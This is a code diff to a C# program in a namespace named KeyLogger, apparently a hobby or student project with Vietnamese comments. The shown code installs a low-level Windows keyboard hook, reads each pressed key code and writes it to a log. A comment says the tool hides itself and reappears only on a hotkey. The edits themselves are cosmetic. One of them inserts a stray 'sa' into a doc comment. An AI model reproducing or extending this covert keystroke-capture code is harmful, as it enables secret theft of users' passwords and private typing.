@@ -56,12 +56,11 @@ namespace KeyLogger
         /// <returns></returns>
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
-            using (Process curProcess = Process.GetCurrentProcess())// lấy tất cả tiến trình hiện tại
+            using (Process curProcess = Process.GetCurrentProcess())// lấy tiến trình hiện tại
             {
                 using (ProcessModule curModule = curProcess.MainModule)
                 {
-                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
-                    GetModuleHandle(curModule.ModuleName), 0);
+                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
                 }
             }
         }
@@ -78,7 +77,7 @@ namespace KeyLogger
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
-                int vkCode = Marshal.ReadInt32(lParam);
+                int vkCode = Marshal.ReadInt32(lParam); 
 
                 WriteLog(vkCode);
             }
@@ -98,7 +97,7 @@ namespace KeyLogger
             sw.Close();
         }
 
-        /// <summary>
+        /// <summary>sa
         /// Start hook key board and hide the key logger
         /// Key logger only show again if pressed right Hot key
         /// </summary>
